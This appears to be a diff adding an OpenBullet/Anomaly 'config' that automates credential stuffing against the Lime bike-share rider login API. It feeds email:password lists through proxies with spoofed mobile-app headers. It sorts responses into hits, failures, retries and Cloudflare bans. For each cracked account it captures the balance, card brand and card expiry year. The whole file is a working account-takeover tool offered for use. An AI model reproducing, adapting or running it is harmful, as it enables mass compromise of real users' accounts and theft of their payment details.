@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "Lime",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-24T19:52:54.1870214+00:00",
+  "AdditionalInfo": "",
+  "Author": "hoodrat",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://web-production.lime.bike/api/rider/v1/login" AutoRedirect=FALSE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"platform\":\"Android\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: okhttp/3.10.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "App-Version: 2.28.3" 
+  HEADER "X-Device-Token: 1628ea9c-4155-4ba7-a0bf-b7499d1ba7e4" 
+  HEADER "X-Session-ID: 1547497193324" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+    KEY "Please enter a valid email address" 
+    KEY "That user cannot be found" 
+  KEYCHAIN Success OR 
+    KEY "token\":\"" 
+  KEYCHAIN Retry OR 
+    KEY "Too many attempts. Please wait and try again later.\"}" 
+    KEY "{\"ok\": true}" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "default_payment_method\":null," 
+  KEYCHAIN Ban OR 
+    KEY "Access denied | web-production.lime.bike used Cloudflare to restrict access" 
+
+PARSE "<SOURCE>" LR "balance\":{\"currency_code\":\"" "\"" -> CAP "currency" 
+
+PARSE "<SOURCE>" LR ",\"balance\":{\"currency_code\":\"<currency>\",\"amount\":" ",\"" -> VAR "amount" 
+
+PARSE "<SOURCE>" LR ",\"brand\":\"" "\",\"" -> CAP "Card type" 
+
+PARSE "<SOURCE>" LR ",\"exp_year\":\"" "\",\"" -> CAP "card expires" 
+
+FUNCTION Constant "<amount[2]>" -> CAP "Balance" 
+
